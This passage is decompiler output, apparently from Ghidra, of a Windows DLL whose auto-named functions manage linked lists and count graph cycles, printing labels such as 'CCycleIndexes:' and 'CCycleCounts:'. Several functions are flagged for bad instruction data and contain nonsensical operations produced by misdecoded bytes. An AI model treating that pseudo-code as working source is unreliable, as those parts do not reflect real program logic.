    return;
  }
  do {
    FUN_102287e1();
    pcVar3 = (code *)CONCAT31((int3)((uint)pcVar3 >> 8),(byte)pcVar3 >> ((byte)extraout_ECX & 0x1f))
    ;
    cVar5 = SCARRY4(extraout_ECX,in_stack_7d830045);
    cVar4 = extraout_ECX + in_stack_7d830045 < 0;
    func_0x9314cced();
  } while (cVar5 == cVar4);
  do {
    if (local_14 == 1) goto LAB_100157e9;
    do {
      DAT_1009918c = '\x01';
LAB_100157e9:
      do {
        (*unaff_EDI)(local_20);
        (*pcVar3)(local_20);
        if (DAT_1009918c != '\0') {
          return;
        }
        iVar2 = (*unaff_ESI)(local_20,0,0,0);
        if (iVar2 == 0) {
          return;
        }
      } while (iStack_1c != 0x16);
    } while (iStack_18 != 0);
  } while( true );
}



/* Function: FUN_10015820 */

/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Instruction at (ram,0x1001585c) overlaps instruction at (ram,0x1001585b)
    */

undefined4 FUN_10015820(undefined4 param_1,int param_2,int param_3,int param_4)

{
  undefined4 uVar1;
  char *pcVar2;
  byte unaff_BL;
  bool bVar3;
  
  if (param_2 != 2) {
    if (param_2 == 0x11) {
      return 1;
    }
    if (param_2 != 0x16) {
      uVar1 = (*DAT_10079430)();
      return uVar1;
    }
    if ((param_3 == 0) && (param_4 == 1)) {
      return 0;
    }
    DAT_1009918c = 1;
    pcVar2 = (char *)FUN_1067886d(0);
    bVar3 = CARRY1(bRam0000017a,unaff_BL);
    bRam0000017a = bRam0000017a + unaff_BL;
    *pcVar2 = *pcVar2 + (char)pcVar2 + bVar3;
  }
  FUN_102aed04(0);
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* Function: FUN_10015880 */

/* WARNING: Instruction at (ram,0x100159b0) overlaps instruction at (ram,0x100159af)
    */
/* WARNING: Removing unreachable block (ram,0x100159c1) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_10015880(void)

{
  char cVar1;
  int iVar2;
  int *piVar3;
  int *piVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  undefined1 *puVar7;
  bool bVar8;
  bool bVar9;
  int *local_74;
  int *local_68;
  uint local_58;
  uint local_54;
  uint local_50;
  uint local_4c;
  uint local_30;
  int local_2c;
  uint local_28;
  uint local_24;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puVar5 = (undefined4 *)&stack0xfffffffc;
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074c52;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  bVar8 = false;
  DAT_1009b46c = (int *)0x0;
  DAT_1009b470 = 0;
  iVar2 = FUN_10058463();
  puVar7 = &stack0xfffffffc;
  if ((iVar2 == 0) ||
     (piVar3 = (int *)FUN_1001a730(), puVar7 = &stack0xfffffffc, piVar3 == (int *)0x0))
  goto LAB_10015ac7;
  FUN_1002e880();
  local_8 = 0;
  if (DAT_10079304 != 0) {
    FUN_10021d40();
  }
  local_8 = 1;
  iVar2 = FUN_10058463();
  local_8._0_1_ = 2;
  if (iVar2 == 0) {
    local_68 = (int *)0x0;
  }
  else {
    piVar4 = (int *)FUN_1000ae10();
    bVar8 = true;
    if (*piVar4 == 0) {
      local_68 = (int *)FUN_1001a730();
    }
    else {
      local_68 = (int *)FUN_1001a730();
    }
  }
  local_8 = CONCAT31(local_8._1_3_,1);
  if ((bVar8) && (local_74 != (int *)0x0)) {
    LOCK();
    iVar2 = *local_74;
    *local_74 = iVar2 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee();
    }
  }
  if (local_68 == (int *)0x0) {
    FUN_10500531();
    thunk_FUN_100579ee();
    puVar7 = &stack0xfffffffc;
    goto LAB_10015ac7;
  }
  FUN_1002e880();
  if (*piVar3 != 0) {
    DAT_1009b46c = piVar3;
  }
  if ((((local_30 < 5) || (local_2c == 0)) || (local_28 < 0xa28)) || (local_24 < 0x884)) {
LAB_10015a1d:
    bVar9 = (int)local_24 < 0;
    bVar8 = local_24 == 0;
    if (!bVar8) {
      bVar9 = (int)(local_58 - 5) < 0;
      bVar8 = local_58 == 5;
      if (local_58 < 6) {
        if (4 < local_58) {
          bVar9 = (int)(local_54 - 1) < 0;
          bVar8 = local_54 == 1;
          if (1 < local_54) goto LAB_10015a4a;
          if (local_54 != 0) {
            bVar9 = (int)(local_50 - 0xa28) < 0;
            bVar8 = local_50 == 0xa28;
            if (0xa28 < local_50) goto LAB_10015a4a;
            if (0xa27 < local_50) {
              bVar9 = (int)(local_4c - 0x884) < 0;
              bVar8 = local_4c == 0x884;
              if (0x884 < local_4c) goto LAB_10015a4a;
            }
          }
        }
      }
      else {
LAB_10015a4a:
        iVar2 = FUN_1002e9d0();
        bVar9 = iVar2 < 0;
        bVar8 = iVar2 == 0;
        if (!bVar8) {
          DAT_1009b470 = 1;
          DAT_1009b46c = piVar3;
        }
      }
    }
  }
  else {
    bVar9 = (int)local_24 < 0;
    bVar8 = local_24 == 0;
    if (!bVar8) {
      DAT_1009b46c = local_68;
      DAT_1009b470 = 1;
      goto LAB_10015a1d;
    }
  }
  FUN_1048c4d0();
  if (bVar8) {
    return;
  }
  puVar6 = (undefined4 *)&stack0x0000f0b7;
  cVar1 = '\x0e';
  do {
    puVar5 = puVar5 + -1;
    puVar6 = puVar6 + -1;
    *puVar6 = *puVar5;
    cVar1 = cVar1 + -1;
  } while ('\0' < cVar1);
  _DAT_00000000 = _DAT_00000000 << 8 | _DAT_00000000 >> 0x18;
  puVar7 = &stack0x0000f0b7;
  if (bVar9) {
    FUN_100579ee();
    puVar7 = &stack0x0000f0b7;
  }
LAB_10015ac7:
  ExceptionList = *(void **)(puVar7 + -0xc);
  FUN_100579df();
  return;
}



/* Function: FUN_10015af0 */

bool FUN_10015af0(int param_1,int param_2)

{
  return *(uint *)(param_2 + 4) < *(uint *)(param_1 + 4);
}



/* Function: FUN_10015b10 */

bool FUN_10015b10(int param_1,int param_2)

{
  return *(int *)(param_2 + 8) < *(int *)(param_1 + 8);
}



/* Function: FUN_10015b30 */

void __fastcall FUN_10015b30(undefined4 *param_1)

{
  FUN_10015d30();
  thunk_FUN_100579ee(*param_1);
  return;
}



/* Function: FUN_10015b50 */

void __fastcall FUN_10015b50(undefined4 *param_1)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined1 local_24 [8];
  undefined4 local_1c;
  undefined4 *local_18;
  undefined4 local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074c90;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  puVar3 = (undefined4 *)FUN_100582fa(8,DAT_100956e0 ^ (uint)&stack0xfffffffc);
  if (puVar3 == (undefined4 *)0x0) {
    puVar3 = (undefined4 *)0x0;
  }
  else {
    *puVar3 = 0xffffffff;
    puVar3[1] = 0xffffffff;
  }
  local_14 = 0;
  local_8 = 0;
  local_18 = puVar3;
  FUN_10015dc0(&local_18);
  local_1c = 0;
  local_8 = CONCAT31(local_8._1_3_,1);
  FUN_10015c40(local_24);
  FUN_10015ce0();
  iVar1 = puVar3[1];
  puVar3[1] = 0xffffffff;
  *puVar3 = 0xffffffff;
  while (iVar1 != -1) {
    iVar2 = *(int *)(iVar1 + 4);
    thunk_FUN_100579ee(iVar1);
    iVar1 = iVar2;
  }
  thunk_FUN_100579ee(puVar3);
  param_1[2] = *(undefined4 *)*param_1;
  ExceptionList = local_10;
  return;
}



/* Function: thunk_FUN_10015ce0 */

void __fastcall thunk_FUN_10015ce0(int *param_1)

{
  int iVar1;
  int iVar2;
  
  iVar1 = *(int *)(*param_1 + 4);
  *(undefined4 *)(*param_1 + 4) = 0xffffffff;
  *(undefined4 *)*param_1 = 0xffffffff;
  while (iVar1 != -1) {
    iVar2 = *(int *)(iVar1 + 4);
    thunk_FUN_100579ee(iVar1);
    iVar1 = iVar2;
  }
  param_1[1] = 0;
  thunk_FUN_100579ee(*param_1);
  return;
}



/* Function: FUN_10015c40 */

void __thiscall FUN_10015c40(int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074cbb;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  iVar2 = FUN_100582fa(0x14,DAT_100956e0 ^ (uint)&stack0xfffffffc);
  local_8 = 0;
  if (iVar2 == 0) {
    iVar2 = 0;
  }
  else {
    FUN_10015dc0(param_2);
    *(undefined4 *)(iVar2 + 8) = *(undefined4 *)(param_2 + 8);
    *(undefined4 *)(iVar2 + 0xc) = 0xffffffff;
    *(undefined4 *)(iVar2 + 0x10) = 0xffffffff;
  }
  iVar1 = *(int *)*param_1;
  if (iVar1 == -1) {
    *(int *)*param_1 = iVar2;
    *(int *)(*param_1 + 4) = iVar2;
  }
  else {
    *(int *)(iVar1 + 0xc) = iVar2;
    *(undefined4 *)(iVar2 + 0x10) = *(undefined4 *)*param_1;
    *(int *)*param_1 = iVar2;
  }
  param_1[1] = param_1[1] + 1;
  ExceptionList = local_10;
  return;
}



/* Function: FUN_10015ce0 */

void __fastcall FUN_10015ce0(int *param_1)

{
  int iVar1;
  int iVar2;
  
  iVar1 = *(int *)(*param_1 + 4);
  *(undefined4 *)(*param_1 + 4) = 0xffffffff;
  *(undefined4 *)*param_1 = 0xffffffff;
  while (iVar1 != -1) {
    iVar2 = *(int *)(iVar1 + 4);
    thunk_FUN_100579ee(iVar1);
    iVar1 = iVar2;
  }
  param_1[1] = 0;
  thunk_FUN_100579ee(*param_1);
  return;
}



/* Function: FUN_10015d30 */

void __fastcall FUN_10015d30(int *param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int *piVar4;
  
  piVar4 = *(int **)(*param_1 + 4);
  *(undefined4 *)(*param_1 + 4) = 0xffffffff;
  *(undefined4 *)*param_1 = 0xffffffff;
  if (piVar4 != (int *)0xffffffff) {
    do {
      piVar1 = (int *)piVar4[3];
      iVar2 = *(int *)(*piVar4 + 4);
      *(undefined4 *)(*piVar4 + 4) = 0xffffffff;
      *(undefined4 *)*piVar4 = 0xffffffff;
      while (iVar2 != -1) {
        iVar3 = *(int *)(iVar2 + 4);
        thunk_FUN_100579ee(iVar2);
        iVar2 = iVar3;
      }
      piVar4[1] = 0;
      thunk_FUN_100579ee(*piVar4);
      thunk_FUN_100579ee(piVar4);
      piVar4 = piVar1;
    } while (piVar1 != (int *)0xffffffff);
    param_1[1] = 0;
    return;
  }
  param_1[1] = 0;
  return;
}



/* Function: FUN_10015dc0 */

int * __thiscall FUN_10015dc0(int *param_1,int *param_2)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  
  puVar2 = (undefined4 *)FUN_100582fa(8);
  if (puVar2 == (undefined4 *)0x0) {
    puVar2 = (undefined4 *)0x0;
  }
  else {
    *puVar2 = 0xffffffff;
    puVar2[1] = 0xffffffff;
  }
  *param_1 = (int)puVar2;
  param_1[1] = 0;
  for (puVar2 = *(undefined4 **)(*param_2 + 4); puVar2 != (undefined4 *)0xffffffff;
      puVar2 = (undefined4 *)puVar2[1]) {
    puVar3 = (undefined4 *)FUN_100582fa(0xc);
    if (puVar3 == (undefined4 *)0x0) {
      puVar3 = (undefined4 *)0x0;
    }
    else {
      *puVar3 = *puVar2;
      puVar3[1] = 0xffffffff;
      puVar3[2] = 0xffffffff;
    }
    iVar1 = *(int *)*param_1;
    if (iVar1 == -1) {
      *(int *)*param_1 = (int)puVar3;
      *(undefined4 **)(*param_1 + 4) = puVar3;
    }
    else {
      *(undefined4 **)(iVar1 + 4) = puVar3;
      puVar3[2] = *(undefined4 *)*param_1;
      *(undefined4 **)*param_1 = puVar3;
    }
    param_1[1] = param_1[1] + 1;
  }
  return param_1;
}



/* Function: FUN_10015e60 */

void __thiscall FUN_10015e60(int *param_1,undefined4 param_2)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  int *piVar4;
  
  uVar1 = param_1[1];
  piVar2 = (int *)FUN_100582f1(-(uint)((int)((ulonglong)uVar1 * 8 >> 0x20) != 0) |
                               (uint)((ulonglong)uVar1 * 8),&DAT_10098020);
  piVar4 = piVar2;
  if (piVar2 != (int *)0x0) {
    while (uVar1 = uVar1 - 1, -1 < (int)uVar1) {
      *piVar4 = 0;
      piVar4[1] = 0;
      piVar4 = piVar4 + 2;
    }
    piVar4 = piVar2;
    for (iVar3 = *(int *)(*param_1 + 4); iVar3 != -1; iVar3 = *(int *)(iVar3 + 0xc)) {
      *piVar4 = iVar3;
      piVar4[1] = (int)param_1;
      piVar4 = piVar4 + 2;
    }
    FUN_10017a00(param_2);
    thunk_FUN_100579ee(piVar2);
  }
  return;
}



/* Function: FUN_10015ef0 */

void __fastcall FUN_10015ef0(int param_1,int *param_2,int *param_3)

{
  char cVar1;
  uint uVar2;
  undefined4 *puVar3;
  int iVar4;
  undefined4 *puVar5;
  int *piVar6;
  int *piVar7;
  undefined4 *puVar8;
  undefined4 uVar9;
  uint *puVar10;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  int *extraout_ECX_03;
  int *extraout_ECX_04;
  uint extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined4 extraout_ECX_08;
  undefined4 extraout_ECX_09;
  undefined4 extraout_ECX_10;
  undefined4 extraout_ECX_11;
  undefined4 extraout_ECX_12;
  undefined4 extraout_ECX_13;
  undefined4 extraout_ECX_14;
  undefined4 extraout_ECX_15;
  undefined4 extraout_ECX_16;
  undefined4 extraout_ECX_17;
  undefined4 extraout_ECX_18;
  undefined4 extraout_ECX_19;
  undefined4 extraout_ECX_20;
  int iVar11;
  int iVar12;
  int iVar13;
  undefined4 *puVar14;
  int *piVar15;
  char *pcVar16;
  uint uVar17;
  uint uVar18;
  int local_180;
  char local_17c;
  undefined1 local_164 [4];
  int local_160;
  char local_15c;
  int local_158;
  char local_154;
  undefined4 local_150;
  undefined4 local_148;
  undefined4 local_144;
  undefined1 local_140 [4];
  undefined4 local_13c;
  undefined4 local_138;
  undefined4 local_134;
  undefined4 *local_130;
  undefined4 local_12c;
  uint *local_128;
  undefined4 local_124;
  uint *local_120;
  int local_11c;
  undefined4 local_118;
  uint local_114;
  uint local_110;
  int local_10c;
  undefined4 local_108;
  undefined4 local_104;
  int local_100;
  undefined4 local_fc;
  undefined4 local_f8;
  undefined4 *local_f4;
  int local_f0;
  int *local_ec;
  undefined4 *local_e8;
  undefined4 **local_e4;
  int local_e0;
  int *local_dc;
  undefined4 local_d8;
  int *local_d4;
  undefined1 local_d0 [4];
  undefined4 local_cc;
  undefined4 **local_c8;
  int local_c4;
  int *local_c0;
  int *local_bc;
  undefined1 local_b8 [8];
  int *local_b0;
  undefined4 local_a4;
  int local_a0;
  int local_9c;
  int local_98;
  int local_94;
  undefined1 local_8d;
  undefined1 local_8c;
  undefined1 local_8b;
  undefined1 local_8a;
  undefined1 local_89;
  int local_88;
  undefined1 local_81;
  undefined1 local_80;
  undefined1 local_7f;
  undefined1 local_7e;
  undefined1 local_7d;
  undefined4 *local_7c;
  int local_78;
  undefined1 local_71;
  undefined1 local_70;
  undefined1 local_6f;
  undefined1 local_6e;
  undefined1 local_6d;
  int *local_6c;
  undefined1 local_67;
  undefined1 local_66;
  undefined1 local_65;
  int local_64;
  undefined1 local_5d;
  int *local_5c;
  undefined4 *local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 *local_4c;
  int local_48;
  undefined4 local_44;
  int *local_40;
  int *local_3c;
  undefined4 *local_38;
  int local_34;
  int *local_30;
  char local_2a;
  char local_29;
  undefined4 *local_28;
  undefined4 local_24;
  uint local_20;
  int *local_1c;
  undefined4 local_18;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_10074d4c;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_8a = 0;
  local_10c = param_1;
  local_3c = param_2;
  FUN_10016e70(param_1);
  local_8 = 0;
  local_28 = (undefined4 *)0x0;
  local_24 = 0;
  local_28 = (undefined4 *)FUN_10017840(uVar2);
  local_8._0_1_ = 1;
  local_58 = (undefined4 *)0x0;
  local_54 = 0;
  local_58 = (undefined4 *)FUN_10017840();
  local_8 = CONCAT31(local_8._1_3_,2);
  puVar8 = (undefined4 *)*param_2;
  puVar3 = (undefined4 *)FUN_10016fe0();
  puVar5 = (undefined4 *)0x0;
  if (puVar8 != puVar3) {
    do {
      if ((undefined4 *)*param_2 != puVar8) {
        local_138 = *puVar5;
        local_88 = 0;
        local_134 = 0;
        iVar4 = FUN_100181e0(&local_138);
        FUN_10018210(&local_160,extraout_ECX,iVar4 + 0x10,iVar4);
        local_5d = 0;
        local_7f = 0;
        local_81 = 0;
        local_89 = 0;
        local_8b = 0;
        local_66 = 0;
        local_71 = 0;
        local_7d = 0;
        local_8d = 0;
        local_88 = local_160;
        local_29 = local_15c;
        if (local_15c == '\0') {
          local_20 = *(uint *)(local_160 + 0x14);
        }
        else {
          local_114 = FUN_10018a40();
          *(int *)(local_114 + 0x10) = local_98;
          local_a0 = local_a0 + 1;
          local_98 = local_98 + 1;
          *(uint *)(local_88 + 0x14) = local_114;
          uVar9 = *puVar5;
          local_20 = local_114;
          puVar5 = (undefined4 *)FUN_100171d0(&local_114);
          *puVar5 = uVar9;
        }
        local_148 = *puVar8;
        local_64 = 0;
        local_144 = 0;
        iVar4 = FUN_100181e0(&local_148);
        FUN_10018210(&local_158,extraout_ECX_00,iVar4 + 0x10,iVar4);
        local_65 = 0;
        local_6e = 0;
        local_70 = 0;
        local_7e = 0;
        local_67 = 0;
        local_8c = 0;
        local_6d = 0;
        local_80 = 0;
        local_6f = 0;
        local_64 = local_158;
        local_2a = local_154;
        if (local_154 == '\0') {
          iVar4 = *(int *)(local_158 + 0x14);
        }
        else {
          iVar4 = FUN_10018a40();
          *(int *)(iVar4 + 0x10) = local_98;
          local_a0 = local_a0 + 1;
          local_98 = local_98 + 1;
          *(int *)(local_64 + 0x14) = iVar4;
          uVar9 = *puVar8;
          local_100 = iVar4;
          puVar5 = (undefined4 *)FUN_100171d0(&local_100);
          *puVar5 = uVar9;
        }
        local_140[0] = 0;
        local_13c = 0;
        FUN_10018910(iVar4,local_140,local_b8);
        param_2 = local_3c;
        if (local_17c != '\0') {
          *(int *)(local_180 + 4) = local_94;
          local_9c = local_9c + 1;
          local_94 = local_94 + 1;
        }
      }
      puVar14 = puVar8 + 1;
      puVar3 = (undefined4 *)FUN_10016fe0();
      puVar5 = puVar8;
      puVar8 = puVar14;
    } while (puVar14 != puVar3);
  }
  FUN_10017380(local_d0,*local_58,local_58);
  thunk_FUN_100579ee(local_58);
  local_1c = (int *)0x0;
  local_18 = 0;
  if ((DAT_1009ad10 & 1) == 0) {
    DAT_1009ad10 = DAT_1009ad10 | 1;
    local_8 = CONCAT31(local_8._1_3_,4);
    uVar2 = FUN_10049e00();
    DAT_1009ad0c = uVar2 & 0xff;
    FUN_10057b51(&DAT_10078450);
  }
  iVar13 = local_9c;
  iVar4 = local_a0;
  local_8 = CONCAT31(local_8._1_3_,5);
  local_1c = (int *)FUN_10007b60("num_edges(g):",0xffffffff);
  local_1c = (int *)FUN_10007280(iVar13,extraout_ECX_01);
  local_1c = (int *)FUN_10007b60(", num_vertices(g):",0xffffffff);
  local_1c = (int *)FUN_10007280(iVar4,extraout_ECX_02);
  if (local_1c != (int *)0x0) {
    if (local_1c[2] != 0) {
      FUN_10006250(&DAT_10083ff0,local_1c + 3);
      if (local_1c != (int *)0x0) {
        if (*local_1c == 0) {
          local_1c[2] = 0;
          *(undefined1 *)(local_1c + 3) = 0;
          goto LAB_100162b0;
        }
        LOCK();
        iVar4 = *local_1c;
        *local_1c = iVar4 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(local_1c);
        }
      }
      local_1c = (int *)0x0;
    }
LAB_100162b0:
    if ((local_1c != (int *)0x0) && (local_1c[2] != 0)) {
      FUN_10006250(&DAT_10083ff0,local_1c + 3);
      if (local_1c != (int *)0x0) {
        if (*local_1c == 0) {
          local_1c[2] = 0;
          *(undefined1 *)(local_1c + 3) = 0;
          goto LAB_100162fe;
        }
        LOCK();
        iVar4 = *local_1c;
        *local_1c = iVar4 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(local_1c);
        }
      }
      local_1c = (int *)0x0;
    }
  }
LAB_100162fe:
  local_5c = (int *)*local_b0;
  local_bc = local_b0;
  piVar6 = local_b0;
  if (local_5c != local_b0) {
    do {
      FUN_10018320(&local_1c,piVar6,0xffffffff);
      local_5c = (int *)*local_5c;
      piVar6 = extraout_ECX_03;
    } while (local_5c != local_bc);
  }
  if ((local_1c != (int *)0x0) && (local_1c[2] != 0)) {
    FUN_10006250(&DAT_10083ff0,local_1c + 3);
    if (local_1c != (int *)0x0) {
      if (*local_1c == 0) {
        local_1c[2] = 0;
        *(undefined1 *)(local_1c + 3) = 0;
        goto LAB_1001639d;
      }
      LOCK();
      iVar4 = *local_1c;
      *local_1c = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(local_1c);
      }
    }
    local_1c = (int *)0x0;
  }
LAB_1001639d:
  local_4c = (undefined4 *)FUN_100582fa(8);
  if (local_4c == (undefined4 *)0x0) {
    local_4c = (undefined4 *)0x0;
  }
  else {
    *local_4c = 0xffffffff;
    local_4c[1] = 0xffffffff;
  }
  local_48 = 0;
  local_8._0_1_ = 6;
  local_44 = 0;
  FUN_10015b50();
  local_8 = CONCAT31(local_8._1_3_,7);
  local_6c = (int *)*local_b0;
  local_40 = local_b0;
  piVar6 = local_b0;
  if (local_6c != local_b0) {
    do {
      FUN_10018510(&local_4c,piVar6,0xffffffff);
      local_6c = (int *)*local_6c;
      piVar6 = extraout_ECX_04;
    } while (local_6c != local_40);
  }
  local_1c = (int *)FUN_10007b60("CCycleIndexes:",0xffffffff);
  if ((local_1c != (int *)0x0) && (local_1c[2] != 0)) {
    FUN_10006250(&DAT_10083ff0,local_1c + 3);
    if (local_1c != (int *)0x0) {
      if (*local_1c == 0) {
        local_1c[2] = 0;
        *(undefined1 *)(local_1c + 3) = 0;
        goto LAB_10016487;
      }
      LOCK();
      iVar4 = *local_1c;
      *local_1c = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(local_1c);
      }
    }
    local_1c = (int *)0x0;
  }
LAB_10016487:
  local_30 = (int *)local_4c[1];
  piVar6 = local_1c;
  while (local_30 != (int *)0xffffffff) {
    for (piVar15 = *(int **)(*local_30 + 4); piVar15 != (int *)0xffffffff;
        piVar15 = (int *)piVar15[1]) {
      puVar8 = (undefined4 *)*local_b0;
      for (iVar4 = *piVar15; iVar4 != 0; iVar4 = iVar4 + -1) {
        puVar8 = (undefined4 *)*puVar8;
      }
      uVar2 = puVar8[2];
      cVar1 = *(char *)((int)local_28[1] + 0xd);
      puVar8 = (undefined4 *)local_28[1];
      puVar5 = local_28;
      while (puVar3 = puVar8, cVar1 == '\0') {
        if ((uint)puVar3[4] < uVar2) {
          puVar8 = (undefined4 *)puVar3[2];
          puVar3 = puVar5;
        }
        else {
          puVar8 = (undefined4 *)*puVar3;
        }
        cVar1 = *(char *)((int)puVar8 + 0xd);
        puVar5 = puVar3;
      }
      local_110 = uVar2;
      if ((puVar5 == local_28) || (uVar2 < (uint)puVar5[4])) {
        local_120 = &local_110;
        iVar4 = FUN_10017e00(uVar2,&local_120,uVar2);
        FUN_10017e30(&local_f4,puVar5,iVar4 + 0x10,iVar4);
        uVar2 = extraout_ECX_05;
        puVar5 = local_f4;
      }
      uVar9 = puVar5[5];
      local_1c = (int *)FUN_10007280(*piVar15,uVar2);
      local_1c = (int *)FUN_10007b60(&DAT_10083f8c,0xffffffff);
      local_1c = (int *)FUN_10007280(uVar9,extraout_ECX_06);
      piVar6 = (int *)FUN_10007b60(&DAT_10083f90,0xffffffff);
      local_1c = piVar6;
    }
    if ((piVar6 != (int *)0x0) && (piVar6[2] != 0)) {
      FUN_10006250(&DAT_10083ff0,piVar6 + 3);
      if (local_1c != (int *)0x0) {
        if (*local_1c == 0) {
          local_1c[2] = 0;
          *(undefined1 *)(local_1c + 3) = 0;
          piVar6 = local_1c;
          goto LAB_100165c1;
        }
        LOCK();
        iVar4 = *local_1c;
        *local_1c = iVar4 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(local_1c);
        }
      }
      piVar6 = (int *)0x0;
      local_1c = piVar6;
    }
LAB_100165c1:
    piVar15 = (int *)*local_3c;
    piVar7 = (int *)FUN_10016fe0();
    if (piVar15 == piVar7) {
LAB_100166e9:
      local_30 = (int *)local_30[3];
    }
    else {
      do {
        piVar6 = *(int **)(*local_30 + 4);
        if (piVar6 == (int *)0xffffffff) break;
        puVar8 = (undefined4 *)*local_b0;
        for (iVar4 = *piVar6; iVar4 != 0; iVar4 = iVar4 + -1) {
          puVar8 = (undefined4 *)*puVar8;
        }
        local_20 = puVar8[2];
        cVar1 = *(char *)((int)local_28[1] + 0xd);
        puVar8 = (undefined4 *)local_28[1];
        puVar5 = local_28;
        while (puVar3 = puVar8, cVar1 == '\0') {
          if ((uint)puVar3[4] < local_20) {
            puVar8 = (undefined4 *)puVar3[2];
            puVar3 = puVar5;
          }
          else {
            puVar8 = (undefined4 *)*puVar3;
          }
          cVar1 = *(char *)((int)puVar8 + 0xd);
          puVar5 = puVar3;
        }
        if ((puVar5 == local_28) || (local_20 < (uint)puVar5[4])) {
          local_128 = &local_20;
          iVar4 = FUN_10017e00(local_20,&local_128,local_20);
          FUN_10017e30(&local_130,puVar5,iVar4 + 0x10,iVar4);
          puVar5 = local_130;
        }
        if (*piVar15 == puVar5[5]) {
          for (; (piVar6 != (int *)0xffffffff && (piVar7 = (int *)FUN_10016fe0(), piVar15 != piVar7)
                 ); piVar15 = piVar15 + 1) {
            puVar8 = (undefined4 *)*local_b0;
            for (iVar4 = *piVar6; iVar4 != 0; iVar4 = iVar4 + -1) {
              puVar8 = (undefined4 *)*puVar8;
            }
            local_20 = puVar8[2];
            piVar7 = (int *)FUN_100171d0(&local_20);
            if (*piVar15 != *piVar7) goto LAB_100166bb;
            piVar6 = (int *)piVar6[1];
          }
          local_30[2] = local_30[2] + 1;
LAB_100166bb:
          piVar7 = (int *)FUN_10016fe0();
          piVar6 = local_1c;
          if (piVar15 == piVar7) goto LAB_100166e9;
        }
        piVar15 = piVar15 + 1;
        piVar6 = (int *)FUN_10016fe0();
      } while (piVar15 != piVar6);
      local_30 = (int *)local_30[3];
      piVar6 = local_1c;
    }
  }
  local_1c = (int *)FUN_10007b60("CCycleIndexes:",0xffffffff);
  FUN_10017c10(extraout_ECX_07);
  for (piVar6 = (int *)local_4c[1]; piVar6 != (int *)0xffffffff; piVar6 = (int *)piVar6[3]) {
    if (piVar6[1] != 0) {
      for (piVar15 = *(int **)(*piVar6 + 4); piVar15 != (int *)0xffffffff;
          piVar15 = (int *)piVar15[1]) {
        puVar8 = (undefined4 *)*local_b0;
        for (iVar4 = *piVar15; iVar4 != 0; iVar4 = iVar4 + -1) {
          puVar8 = (undefined4 *)*puVar8;
        }
        local_12c = puVar8[2];
        puVar8 = (undefined4 *)FUN_100171d0(&local_12c);
        uVar9 = *puVar8;
        local_1c = (int *)FUN_10007280(*piVar15,extraout_ECX_08);
        local_1c = (int *)FUN_10007b60(&DAT_10083f8c,0xffffffff);
        local_1c = (int *)FUN_10007280(uVar9,extraout_ECX_09);
        local_1c = (int *)FUN_10007b60(&DAT_10083f90,0xffffffff);
      }
      local_1c = (int *)FUN_10007b60("count=",0xffffffff);
      local_1c = (int *)FUN_10018050(piVar6[2],extraout_ECX_10);
      FUN_10017c10(extraout_ECX_11);
    }
  }
  FUN_10015e60(FUN_10015b10);
  local_40 = (int *)0x0;
  iVar4 = local_48;
  if (local_48 != 0) {
    iVar4 = local_48 + -1;
  }
  if (local_4c[1] != -1) {
    local_40 = *(int **)(local_4c[1] + 8);
  }
  local_1c = (int *)FUN_10007b60("CCycleCounts:",0xffffffff);
  FUN_10017c10(extraout_ECX_12);
  iVar13 = local_4c[1];
  uVar9 = extraout_ECX_13;
  iVar11 = -1;
  while ((iVar13 != -1 && (iVar4 != 0))) {
    local_1c = (int *)FUN_10018050(*(undefined4 *)(iVar13 + 8),uVar9);
    FUN_10017c10(extraout_ECX_14);
    iVar12 = iVar11;
    if ((*(int *)(iVar13 + 4) != 0) && (iVar12 = iVar13, *(int *)(iVar13 + 8) < (int)local_40))
    break;
    iVar13 = *(int *)(iVar13 + 0xc);
    uVar9 = extraout_ECX_15;
    iVar11 = iVar12;
  }
  local_7c = (undefined4 *)FUN_100582fa(8);
  if (local_7c == (undefined4 *)0x0) {
    local_7c = (undefined4 *)0x0;
  }
  else {
    *local_7c = 0xffffffff;
    local_7c[1] = 0xffffffff;
  }
  local_78 = 0;
  local_8._0_1_ = 8;
  if (iVar11 != -1) {
    uVar9 = FUN_10017900(local_4c[1],&local_4c,*(undefined4 *)(iVar11 + 0xc),&local_4c);
    local_8._0_1_ = 9;
    FUN_10016d70(uVar9);
    local_8._0_1_ = 8;
    FUN_10015d30();
    thunk_FUN_100579ee(local_150);
    iVar4 = local_78;
    local_1c = (int *)FUN_10007b60("ci_copy.size()=",0xffffffff);
    local_1c = (int *)FUN_10007280(iVar4,extraout_ECX_16);
    FUN_10017c10(extraout_ECX_17);
    FUN_10015e60(FUN_10015af0);
